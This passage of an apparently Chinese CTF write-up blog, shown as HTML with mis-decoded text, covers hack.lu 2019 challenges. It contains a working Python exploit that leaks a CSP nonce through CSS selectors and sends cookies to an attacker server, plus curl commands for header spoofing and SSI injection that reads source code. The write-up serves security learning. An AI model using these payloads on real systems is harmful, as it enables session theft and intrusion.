class="string">'script[nonce^="%s"] ~ #chatbox'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ #recaptcha'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ nav &gt; a'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ nav &gt; #report-link'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ nav &gt; #username'</span>,</span><br><span class="line">        <span class="string">'body script[nonce^="%s"] ~ #messages'</span>,</span><br><span class="line">        <span class="string">'body script[nonce^="%s"] ~ #status'</span>,</span><br><span class="line">        <span class="string">'body script[nonce^="%s"] ~ #chatbox'</span>,</span><br><span class="line">        <span class="string">'body script[nonce^="%s"] ~ #recaptcha'</span>,</span><br><span class="line">        <span class="string">'body script[nonce^="%s"] ~ nav &gt; a'</span>,</span><br><span class="line">        <span class="string">'body script[nonce^="%s"] ~ nav &gt; #report-link'</span>,</span><br><span class="line">        <span class="string">'body script[nonce^="%s"] ~ nav &gt; #username'</span>,</span><br><span class="line">        <span class="string">'body script[nonce^="%s"] ~ nav &gt; [href="/"]'</span>,</span><br><span class="line">        <span class="string">'body script[nonce^="%s"] ~ nav &gt; [href="#"]'</span>,</span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(nonce, url)</span>:</span></span><br><span class="line">    x = <span class="string">"""&lt;iframe srcdoc="&lt;script nonce=%s&gt;alert(document.cookie); var x = document.createElement('img'); x.src = '%s/res?c=' + document.cookie;&lt;/script&gt;"&gt;&lt;/iframe&gt;"""</span> % (nonce, url)</span><br><span class="line">    msg = &#123;<span class="string">"username"</span> : <span class="string">"aaa"</span>, <span class="string">"type"</span>: <span class="string">"gabbr-message"</span>, <span class="string">"content"</span>: x&#125;</span><br><span class="line">    print(json.dumps(msg))</span><br><span class="line">    socket.send(json.dumps(msg))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_style</span><span class="params">(c, url)</span>:</span></span><br><span class="line">    style = <span class="string">"&lt;style&gt;"</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">"abcdef"</span> + string.digits:</span><br><span class="line">        style = style + ((payloads[len(c)] + <span class="string">'&#123; background:url("%s/?match=%s") &#125; '</span>) % (c + x, url, c + x))</span><br><span class="line">    style = style + <span class="string">"&lt;/style&gt;"</span></span><br><span class="line">    <span class="keyword">return</span> style</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handler</span><span class="params">()</span>:</span></span><br><span class="line">    match = request.args.get(<span class="string">'match'</span>)</span><br><span class="line">    print(match)</span><br><span class="line">    <span class="keyword">if</span> len(match) == <span class="number">24</span>:</span><br><span class="line">        exploit(match, URL)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        send_req(match)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"a"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/res')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">res</span><span class="params">()</span>:</span></span><br><span class="line">    match = request.args.get(<span class="string">'c'</span>)</span><br><span class="line">    print(match)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"a"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_req</span><span class="params">(match)</span>:</span></span><br><span class="line">    msg = &#123;<span class="string">"username"</span> : <span class="string">"aaa"</span>, <span class="string">"type"</span>: <span class="string">"gabbr-message"</span>, <span class="string">"content"</span>: generate_style(match, URL)&#125;</span><br><span class="line">    socket.send(json.dumps(msg))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    uri = <span class="string">"wss://gabbr.hitme.tasteless.eu/"</span> + sys.argv[<span class="number">1</span>]</span><br><span class="line">    socket = websocket.WebSocket()</span><br><span class="line">    socket.connect(uri)</span><br><span class="line">    print(generate_style(<span class="string">""</span>, URL)) <span class="comment"># This outputs the initial payload, we did it manually to avoid certain concurrency issues</span></span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>)</span><br></pre></td></tr></table></figure>

<h4 id="hack-lu-2019-Trees-For-Future"><a href="#hack-lu-2019-Trees-For-Future" class="headerlink" title="hack.lu 2019 - Trees For Future"></a>hack.lu 2019 - Trees For Future</h4><h5 id="ç”¨åˆ°çš„çŸ¥è¯†ã€‚"><a href="#ç”¨åˆ°çš„çŸ¥è¯†ã€‚" class="headerlink" title="ç”¨åˆ°çš„çŸ¥è¯†ã€‚"></a>ç”¨åˆ°çš„çŸ¥è¯†ã€‚</h5><h6 id="SSIæ³¨å…¥ï¼Œè¿æ¥å›æœ¬åœ°MySQLï¼ŒäºŒæ¬¡ç›²æ³¨SQLi"><a href="#SSIæ³¨å…¥ï¼Œè¿æ¥å›æœ¬åœ°MySQLï¼ŒäºŒæ¬¡ç›²æ³¨SQLi" class="headerlink" title="SSIæ³¨å…¥ï¼Œè¿æ¥å›æœ¬åœ°MySQLï¼ŒäºŒæ¬¡ç›²æ³¨SQLi"></a>SSIæ³¨å…¥ï¼Œè¿æ¥å›æœ¬åœ°MySQLï¼ŒäºŒæ¬¡ç›²æ³¨SQLi</h6><h5 id="æè¿°ï¼š"><a href="#æè¿°ï¼š" class="headerlink" title="æè¿°ï¼š"></a>æè¿°ï¼š</h5><h6 id="æˆ‘ä»¬æ˜¯TreesForFutureã€‚æˆ‘ä»¬ç§¯æè‡´åŠ›äºä½¿æ›´å¤šçš„æ ‘æœ¨ç”Ÿé•¿åœ¨è¿™ä¸ªæ˜Ÿçƒã€‚"><a href="#æˆ‘ä»¬æ˜¯TreesForFutureã€‚æˆ‘ä»¬ç§¯æè‡´åŠ›äºä½¿æ›´å¤šçš„æ ‘æœ¨ç”Ÿé•¿åœ¨è¿™ä¸ªæ˜Ÿçƒã€‚" class="headerlink" title="æˆ‘ä»¬æ˜¯TreesForFutureã€‚æˆ‘ä»¬ç§¯æè‡´åŠ›äºä½¿æ›´å¤šçš„æ ‘æœ¨ç”Ÿé•¿åœ¨è¿™ä¸ªæ˜Ÿçƒã€‚"></a>æˆ‘ä»¬æ˜¯TreesForFutureã€‚æˆ‘ä»¬ç§¯æè‡´åŠ›äºä½¿æ›´å¤šçš„æ ‘æœ¨ç”Ÿé•¿åœ¨è¿™ä¸ªæ˜Ÿçƒã€‚</h6><h6 id="æœ€è¿‘ï¼Œæˆ‘ä»¬é›‡ç”¨äº†ä¸€å®¶æ‰¿åŒ…å•†ä¸ºæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªç½‘ç«™ã€‚"><a href="#æœ€è¿‘ï¼Œæˆ‘ä»¬é›‡ç”¨äº†ä¸€å®¶æ‰¿åŒ…å•†ä¸ºæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªç½‘ç«™ã€‚" class="headerlink" title="æœ€è¿‘ï¼Œæˆ‘ä»¬é›‡ç”¨äº†ä¸€å®¶æ‰¿åŒ…å•†ä¸ºæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªç½‘ç«™ã€‚"></a>æœ€è¿‘ï¼Œæˆ‘ä»¬é›‡ç”¨äº†ä¸€å®¶æ‰¿åŒ…å•†ä¸ºæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªç½‘ç«™ã€‚</h6><h6 id="é¢˜ç›®çš„åœ°å€åœ¨è¿™é‡Œhttp-31-22-123-49-1908"><a href="#é¢˜ç›®çš„åœ°å€åœ¨è¿™é‡Œhttp-31-22-123-49-1908" class="headerlink" title="é¢˜ç›®çš„åœ°å€åœ¨è¿™é‡Œhttp://31.22.123.49:1908"></a>é¢˜ç›®çš„åœ°å€åœ¨è¿™é‡Œ<a href="http://31.22.123.49:1908." target="_blank" rel="noopener">http://31.22.123.49:1908</a></h6><h4 id="é¢˜ç›®æ€»è§ˆ"><a href="#é¢˜ç›®æ€»è§ˆ" class="headerlink" title="é¢˜ç›®æ€»è§ˆ"></a>é¢˜ç›®æ€»è§ˆ</h4><h6 id="è¿™ä¸ªæŒ‘æˆ˜æä¾›äº†ä¸€ä¸ªç®€å•çš„å•é¡µç½‘ç«™ï¼Œå…¶ä¸­å……æ»¡äº†Lorem-ipsumå¼•å·å’Œä¸€é¢—æ ‘çš„å›¾ç‰‡ã€‚"><a href="#è¿™ä¸ªæŒ‘æˆ˜æä¾›äº†ä¸€ä¸ªç®€å•çš„å•é¡µç½‘ç«™ï¼Œå…¶ä¸­å……æ»¡äº†Lorem-ipsumå¼•å·å’Œä¸€é¢—æ ‘çš„å›¾ç‰‡ã€‚" class="headerlink" title="è¿™ä¸ªæŒ‘æˆ˜æä¾›äº†ä¸€ä¸ªç®€å•çš„å•é¡µç½‘ç«™ï¼Œå…¶ä¸­å……æ»¡äº†Lorem ipsumå¼•å·å’Œä¸€é¢—æ ‘çš„å›¾ç‰‡ã€‚"></a>è¿™ä¸ªæŒ‘æˆ˜æä¾›äº†ä¸€ä¸ªç®€å•çš„å•é¡µç½‘ç«™ï¼Œå…¶ä¸­å……æ»¡äº†Lorem ipsumå¼•å·å’Œä¸€é¢—æ ‘çš„å›¾ç‰‡ã€‚</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/site.png" alt></p>
<h6 id="å¯¹é¡µé¢HTMLä»£ç çš„å¿«é€Ÿåˆ†ææ˜¾ç¤ºäº†æ‰˜ç®¡å›¾ç‰‡çš„è·¯å¾„ã€‚"><a href="#å¯¹é¡µé¢HTMLä»£ç çš„å¿«é€Ÿåˆ†ææ˜¾ç¤ºäº†æ‰˜ç®¡å›¾ç‰‡çš„è·¯å¾„ã€‚" class="headerlink" title="å¯¹é¡µé¢HTMLä»£ç çš„å¿«é€Ÿåˆ†ææ˜¾ç¤ºäº†æ‰˜ç®¡å›¾ç‰‡çš„è·¯å¾„ã€‚"></a>å¯¹é¡µé¢HTMLä»£ç çš„å¿«é€Ÿåˆ†ææ˜¾ç¤ºäº†æ‰˜ç®¡å›¾ç‰‡çš„è·¯å¾„ã€‚</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;/internal/img/logo_white.png&quot; alt=&quot;Avatar&quot; width=&quot;300&quot; height=&quot;300&quot;&gt;</span><br></pre></td></tr></table></figure>

<h6 id="è¿™ä¸ªç½‘ç«™åœ¨http-31-22-123-49-1908-internal-login"><a href="#è¿™ä¸ªç½‘ç«™åœ¨http-31-22-123-49-1908-internal-login" class="headerlink" title="è¿™ä¸ªç½‘ç«™åœ¨http://31.22.123.49:1908/internal/login"></a>è¿™ä¸ªç½‘ç«™åœ¨<a href="http://31.22.123.49:1908/internal/login" target="_blank" rel="noopener">http://31.22.123.49:1908/internal/login</a></h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/internal.png" alt></p>
<h6 id="è¿™ä¸ªé¡µé¢æä¾›äº†æ³¨å†Œï¼Œç™»é™†å’Œç®¡ç†ä¸€ä¸ªé¡µé¢ï¼Œä¸æ­¤åŒæ—¶è¯¥é¡µé¢å‘Šè¯‰æˆ‘ä»¬ä¸æ˜¯ç®¡ç†å‘˜ã€‚"><a href="#è¿™ä¸ªé¡µé¢æä¾›äº†æ³¨å†Œï¼Œç™»é™†å’Œç®¡ç†ä¸€ä¸ªé¡µé¢ï¼Œä¸æ­¤åŒæ—¶è¯¥é¡µé¢å‘Šè¯‰æˆ‘ä»¬ä¸æ˜¯ç®¡ç†å‘˜ã€‚" class="headerlink" title="è¿™ä¸ªé¡µé¢æä¾›äº†æ³¨å†Œï¼Œç™»é™†å’Œç®¡ç†ä¸€ä¸ªé¡µé¢ï¼Œä¸æ­¤åŒæ—¶è¯¥é¡µé¢å‘Šè¯‰æˆ‘ä»¬ä¸æ˜¯ç®¡ç†å‘˜ã€‚"></a>è¿™ä¸ªé¡µé¢æä¾›äº†æ³¨å†Œï¼Œç™»é™†å’Œç®¡ç†ä¸€ä¸ªé¡µé¢ï¼Œä¸æ­¤åŒæ—¶è¯¥é¡µé¢å‘Šè¯‰æˆ‘ä»¬ä¸æ˜¯ç®¡ç†å‘˜ã€‚</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;custom_tooltip&quot;&gt;You&apos;re not admin.&lt;span class=&quot;custom_tooltiptext&quot;&gt;XXX.XXX.XXX.XXX isn&apos;t admins IP.&lt;/span&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<h5 id="å¼€å§‹åˆ†æï¼š"><a href="#å¼€å§‹åˆ†æï¼š" class="headerlink" title="å¼€å§‹åˆ†æï¼š"></a>å¼€å§‹åˆ†æï¼š</h5><h6 id="æ˜¾ç„¶ï¼Œè¦è¢«è¯†åˆ«ä¸ºç®¡ç†å‘˜ï¼Œæˆ‘ä»¬éœ€è¦æ¥è‡ªç‰¹å®šçš„IPã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬è¦å…ˆæš´éœ²ä¸€ä¸‹ä¸»æœºå†…éƒ¨çš„IPã€‚"><a href="#æ˜¾ç„¶ï¼Œè¦è¢«è¯†åˆ«ä¸ºç®¡ç†å‘˜ï¼Œæˆ‘ä»¬éœ€è¦æ¥è‡ªç‰¹å®šçš„IPã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬è¦å…ˆæš´éœ²ä¸€ä¸‹ä¸»æœºå†…éƒ¨çš„IPã€‚" class="headerlink" title="æ˜¾ç„¶ï¼Œè¦è¢«è¯†åˆ«ä¸ºç®¡ç†å‘˜ï¼Œæˆ‘ä»¬éœ€è¦æ¥è‡ªç‰¹å®šçš„IPã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬è¦å…ˆæš´éœ²ä¸€ä¸‹ä¸»æœºå†…éƒ¨çš„IPã€‚"></a>æ˜¾ç„¶ï¼Œè¦è¢«è¯†åˆ«ä¸ºç®¡ç†å‘˜ï¼Œæˆ‘ä»¬éœ€è¦æ¥è‡ªç‰¹å®šçš„IPã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬è¦å…ˆæš´éœ²ä¸€ä¸‹ä¸»æœºå†…éƒ¨çš„IPã€‚</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X &apos;&apos; http://31.22.123.49:1908/internal/</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;400 Bad Request&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Bad Request&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at 127.0.1.1 Port 13337&lt;/address&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h6 id="ä¸€æ—¦æˆ‘ä»¬çŸ¥é“å†…ç½‘åœ°å€æ˜¯åœ¨127-0-0-1ï¼Œç«¯å£æ˜¯åœ¨13337ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ·»åŠ X-Forwarded-Foræ¥è®©æœåŠ¡å™¨ç›¸ä¿¡æˆ‘ä»¬çš„åŸå§‹IPæ˜¯127-0-0-1ã€‚"><a href="#ä¸€æ—¦æˆ‘ä»¬çŸ¥é“å†…ç½‘åœ°å€æ˜¯åœ¨127-0-0-1ï¼Œç«¯å£æ˜¯åœ¨13337ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ·»åŠ X-Forwarded-Foræ¥è®©æœåŠ¡å™¨ç›¸ä¿¡æˆ‘ä»¬çš„åŸå§‹IPæ˜¯127-0-0-1ã€‚" class="headerlink" title="ä¸€æ—¦æˆ‘ä»¬çŸ¥é“å†…ç½‘åœ°å€æ˜¯åœ¨127.0.0.1ï¼Œç«¯å£æ˜¯åœ¨13337ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ·»åŠ X-Forwarded-Foræ¥è®©æœåŠ¡å™¨ç›¸ä¿¡æˆ‘ä»¬çš„åŸå§‹IPæ˜¯127.0.0.1ã€‚"></a>ä¸€æ—¦æˆ‘ä»¬çŸ¥é“å†…ç½‘åœ°å€æ˜¯åœ¨<code>127.0.0.1</code>ï¼Œç«¯å£æ˜¯åœ¨<code>13337</code>ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ·»åŠ <code>X-Forwarded-For</code>æ¥è®©æœåŠ¡å™¨ç›¸ä¿¡æˆ‘ä»¬çš„åŸå§‹IPæ˜¯<code>127.0.0.1</code>ã€‚</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl -b &apos;PHPSESSID=qloervi3nq447sdlukt2cp0g29&apos; -H &apos;X-Forwarded-For: 127.0.0.1&apos; http://31.22.123.49:1908/internal/admin</span><br><span class="line">...</span><br><span class="line">&lt;div class=&quot;main&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;custom_tooltip&quot;&gt;You&apos;re not admin.&lt;span class=&quot;custom_tooltiptext&quot;&gt;127.0.0.1, XXX.XXX.XXX.XXX isn&apos;t admins IP.&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<h6 id="æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å“åº”æ˜¯æˆåŠŸçš„ï¼Œä½†æ˜¯æ²¡æœ‰æˆäºˆä»»ä½•çš„ç®¡ç†å‘˜æƒé™ã€‚"><a href="#æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å“åº”æ˜¯æˆåŠŸçš„ï¼Œä½†æ˜¯æ²¡æœ‰æˆäºˆä»»ä½•çš„ç®¡ç†å‘˜æƒé™ã€‚" class="headerlink" title="æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å“åº”æ˜¯æˆåŠŸçš„ï¼Œä½†æ˜¯æ²¡æœ‰æˆäºˆä»»ä½•çš„ç®¡ç†å‘˜æƒé™ã€‚"></a>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å“åº”æ˜¯æˆåŠŸçš„ï¼Œä½†æ˜¯æ²¡æœ‰æˆäºˆä»»ä½•çš„ç®¡ç†å‘˜æƒé™ã€‚</h6><h6 id="ç»è¿‡æ•°å°æ—¶çš„éšæœºå°è¯•ï¼Œæˆ‘ä»¬å‘ç°å¯ä»¥è¿›è¡ŒSSIæ³¨å…¥æ¥æ³„éœ²é¡µé¢çš„PHPæºä»£ç ã€‚"><a href="#ç»è¿‡æ•°å°æ—¶çš„éšæœºå°è¯•ï¼Œæˆ‘ä»¬å‘ç°å¯ä»¥è¿›è¡ŒSSIæ³¨å…¥æ¥æ³„éœ²é¡µé¢çš„PHPæºä»£ç ã€‚" class="headerlink" title="ç»è¿‡æ•°å°æ—¶çš„éšæœºå°è¯•ï¼Œæˆ‘ä»¬å‘ç°å¯ä»¥è¿›è¡ŒSSIæ³¨å…¥æ¥æ³„éœ²é¡µé¢çš„PHPæºä»£ç ã€‚"></a>ç»è¿‡æ•°å°æ—¶çš„éšæœºå°è¯•ï¼Œæˆ‘ä»¬å‘ç°å¯ä»¥è¿›è¡Œ<code>SSI</code>æ³¨å…¥æ¥æ³„éœ²é¡µé¢çš„PHPæºä»£ç ã€‚</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -b &apos;PHPSESSID=qloervi3nq447sdlukt2cp0g29&apos; -H &apos;X-Forwarded-For: &lt;!--#include virtual=&quot;admin.phps&quot; --&gt;&apos; http://31.22.123.49:1908/internal/admin</span><br></pre></td></tr></table></figure>

<h6 id="æˆ‘ä»¬å¯¹æ‰€æœ‰çš„é¡µé¢é‡å¤æ­¤è¿‡ç¨‹å»è·å–å…¨éƒ¨æºä»£ç ã€‚ä¸è¿‡æœåŠ¡å™¨é˜»æ­¢æˆ‘ä»¬è®¿é—®ä½äºå½“å‰ç›®å½•ä»¥å¤–çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½è®¿é—®ä¸‹åˆ—çš„æ–‡ä»¶ï¼š-config-phpï¼Œ-db-config-phpï¼Œ-db-credentials-phpã€‚"><a href="#æˆ‘ä»¬å¯¹æ‰€æœ‰çš„é¡µé¢é‡å¤æ­¤è¿‡ç¨‹å»è·å–å…¨éƒ¨æºä»£ç ã€‚ä¸è¿‡æœåŠ¡å™¨é˜»æ­¢æˆ‘ä»¬è®¿é—®ä½äºå½“å‰ç›®å½•ä»¥å¤–çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½è®¿é—®ä¸‹åˆ—çš„æ–‡ä»¶ï¼š-config-phpï¼Œ-db-config-phpï¼Œ-db-credentials-phpã€‚" class="headerlink" title="æˆ‘ä»¬å¯¹æ‰€æœ‰çš„é¡µé¢é‡å¤æ­¤è¿‡ç¨‹å»è·å–å…¨éƒ¨æºä»£ç ã€‚ä¸è¿‡æœåŠ¡å™¨é˜»æ­¢æˆ‘ä»¬è®¿é—®ä½äºå½“å‰ç›®å½•ä»¥å¤–çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½è®¿é—®ä¸‹åˆ—çš„æ–‡ä»¶ï¼š../config.phpï¼Œ../db_config.phpï¼Œ../db_credentials.phpã€‚"></a>æˆ‘ä»¬å¯¹æ‰€æœ‰çš„é¡µé¢é‡å¤æ­¤è¿‡ç¨‹å»è·å–<a href="https://w0y.at/data/ctf/hack.lu2019/trees-for-future.tar.gz" target="_blank" rel="noopener">å…¨éƒ¨æºä»£ç </a>ã€‚ä¸è¿‡æœåŠ¡å™¨é˜»æ­¢æˆ‘ä»¬è®¿é—®ä½äºå½“å‰ç›®å½•ä»¥å¤–çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½è®¿é—®ä¸‹åˆ—çš„æ–‡ä»¶ï¼š<code>../config.php</code>ï¼Œ<code>../db_config.php</code>ï¼Œ<code>../db_credentials.php</code>ã€‚</h6><h5 id="æ‹¿åˆ°æºä»£ç åå¼€å§‹åˆ†æï¼š"><a href="#æ‹¿åˆ°æºä»£ç åå¼€å§‹åˆ†æï¼š" class="headerlink" title="æ‹¿åˆ°æºä»£ç åå¼€å§‹åˆ†æï¼š"></a>æ‹¿åˆ°æºä»£ç åå¼€å§‹åˆ†æï¼š</h5><h6 id="æ¥è‡ªlogin-phpï¼š"><a href="#æ¥è‡ªlogin-phpï¼š" class="headerlink" title="æ¥è‡ªlogin.phpï¼š"></a>æ¥è‡ª<code>login.php</code>ï¼š</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// We had some issues with double encoded values. This fixed it.</span><br><span class="line">$parmas = parse_str(urldecode(file_get_contents(&quot;php://input&quot;)));</span><br></pre></td></tr></table></figure>

<h6 id="åœ¨è¿™é‡Œï¼Œè¯¥parse-str-å‡½æ•°ç”¨äºè§£æPOSTè¯·æ±‚çš„æ­£æ–‡ã€‚PHPæ–‡æ¡£æ˜ç¡®çš„æŒ‡å‡ºã€‚"><a href="#åœ¨è¿™é‡Œï¼Œè¯¥parse-str-å‡½æ•°ç”¨äºè§£æPOSTè¯·æ±‚çš„æ­£æ–‡ã€‚PHPæ–‡æ¡£æ˜ç¡®çš„æŒ‡å‡ºã€‚" class="headerlink" title="åœ¨è¿™é‡Œï¼Œè¯¥parse_str()å‡½æ•°ç”¨äºè§£æPOSTè¯·æ±‚çš„æ­£æ–‡ã€‚PHPæ–‡æ¡£æ˜ç¡®çš„æŒ‡å‡ºã€‚"></a>åœ¨è¿™é‡Œï¼Œè¯¥<code>parse_str()</code>å‡½æ•°ç”¨äºè§£æPOSTè¯·æ±‚çš„æ­£æ–‡ã€‚PHPæ–‡æ¡£æ˜ç¡®çš„æŒ‡å‡ºã€‚</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Warning Using this function without the result parameter is highly DISCOURAGED and DEPRECATED as of PHP 7.2. </span><br><span class="line">Dynamically setting variables in function&apos;s scope suffers from exactly same problems as register_globals. </span><br><span class="line">Read section on security of Using Register Globals explaining why it is dangerous.</span><br></pre></td></tr></table></figure>

<h6 id="äº‹å®ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨POSTè¯·æ±‚ä¸Šä¼ é€’å˜é‡æ¥è®¾ç½®å’Œè¦†ç›–å˜é‡ã€‚"><a href="#äº‹å®ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨POSTè¯·æ±‚ä¸Šä¼ é€’å˜é‡æ¥è®¾ç½®å’Œè¦†ç›–å˜é‡ã€‚" class="headerlink" title="äº‹å®ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨POSTè¯·æ±‚ä¸Šä¼ é€’å˜é‡æ¥è®¾ç½®å’Œè¦†ç›–å˜é‡ã€‚"></a>äº‹å®ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨POSTè¯·æ±‚ä¸Šä¼ é€’å˜é‡æ¥è®¾ç½®å’Œè¦†ç›–å˜é‡ã€‚</h6><h6 id="åç»­è¯·çœ‹https-github-com-lavish-ctf-writeups-tree-master-hacklu2019-TreesForFuture"><a href="#åç»­è¯·çœ‹https-github-com-lavish-ctf-writeups-tree-master-hacklu2019-TreesForFuture" class="headerlink" title="åç»­è¯·çœ‹https://github.com/lavish/ctf-writeups/tree/master/hacklu2019-TreesForFuture"></a>åç»­è¯·çœ‹<a href="https://github.com/lavish/ctf-writeups/tree/master/hacklu2019-TreesForFuture" target="_blank" rel="noopener">https://github.com/lavish/ctf-writeups/tree/master/hacklu2019-TreesForFuture</a></h6><h5 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h5><h6 id="https-w0y-at-writeup-2019-10-24-hacklu-2019-car-repair-shop-html"><a href="#https-w0y-at-writeup-2019-10-24-hacklu-2019-car-repair-shop-html" class="headerlink" title="https://w0y.at/writeup/2019/10/24/hacklu-2019-car-repair-shop.html"></a><a href="https://w0y.at/writeup/2019/10/24/hacklu-2019-car-repair-shop.html" target="_blank" rel="noopener">https://w0y.at/writeup/2019/10/24/hacklu-2019-car-repair-shop.html</a></h6><h6 id="https-gist-github-com-terjanq-fdb23ae109446b826a4b37df88efae07-file-car-repair-js"><a href="#https-gist-github-com-terjanq-fdb23ae109446b826a4b37df88efae07-file-car-repair-js" class="headerlink" title="https://gist.github.com/terjanq/fdb23ae109446b826a4b37df88efae07#file-car_repair-js"></a><a href="https://gist.github.com/terjanq/fdb23ae109446b826a4b37df88efae07#file-car_repair-js" target="_blank" rel="noopener">https://gist.github.com/terjanq/fdb23ae109446b826a4b37df88efae07#file-car_repair-js</a></h6><h6 id="https-github-com-LetzPwn-ctf-writeups-tree-master-hack-lu-2019-Numtonce"><a href="#https-github-com-LetzPwn-ctf-writeups-tree-master-hack-lu-2019-Numtonce" class="headerlink" title="https://github.com/LetzPwn/ctf-writeups/tree/master/hack_lu_2019/Numtonce"></a><a href="https://github.com/LetzPwn/ctf-writeups/tree/master/hack_lu_2019/Numtonce" target="_blank" rel="noopener">https://github.com/LetzPwn/ctf-writeups/tree/master/hack_lu_2019/Numtonce</a></h6><h6 id="https-github-com-lavish-ctf-writeups-tree-master-hacklu2019-TreesForFuture"><a href="#https-github-com-lavish-ctf-writeups-tree-master-hacklu2019-TreesForFuture" class="headerlink" title="https://github.com/lavish/ctf-writeups/tree/master/hacklu2019-TreesForFuture"></a><a href="https://github.com/lavish/ctf-writeups/tree/master/hacklu2019-TreesForFuture" target="_blank" rel="noopener">https://github.com/lavish/ctf-writeups/tree/master/hacklu2019-TreesForFuture</a></h6>
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/12/19/2019balsnCTFçš„Warmupå’Œkoreanfishèµ›åå¤ç°/" rel="next" title="2019balsnCTFçš„Warmupå’Œkoreanfishèµ›åå¤ç°">
                <i class="fa fa-chevron-left"></i> 2019balsnCTFçš„Warmupå’Œkoreanfishèµ›åå¤ç°
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
